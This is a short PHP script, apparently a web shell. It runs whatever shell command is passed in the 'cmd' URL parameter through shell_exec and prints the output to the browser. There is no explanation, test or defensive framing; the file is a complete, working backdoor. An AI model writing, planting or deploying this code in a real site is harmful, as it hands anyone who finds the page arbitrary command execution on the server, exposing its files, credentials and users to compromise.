<?
    header("Content-Type: text/html; charset=EUC-KR");
    $cmd = $_GET["cmd"];
    $result = shell_exec($cmd);
    $result = str_replace("\n", "<br>", $result);
    echo $result;
?>